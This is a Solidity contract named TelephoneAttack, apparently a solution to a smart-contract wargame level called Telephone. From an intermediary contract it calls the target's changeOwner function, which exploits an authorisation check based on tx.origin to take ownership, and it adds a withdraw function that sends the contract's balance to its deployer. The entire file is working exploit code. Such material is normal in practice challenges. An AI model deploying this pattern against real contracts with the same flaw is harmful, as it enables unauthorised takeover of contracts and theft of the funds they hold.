pragma solidity 0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {
 
    Telephone _contract;
    address payable public owner;

    constructor(address payable _add) public {
        owner = msg.sender;
        _contract = Telephone(_add);
    }

    function changeOwnerAttack() public {
        _contract.changeOwner(msg.sender);
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }
    
    receive() external payable{ 
    }

}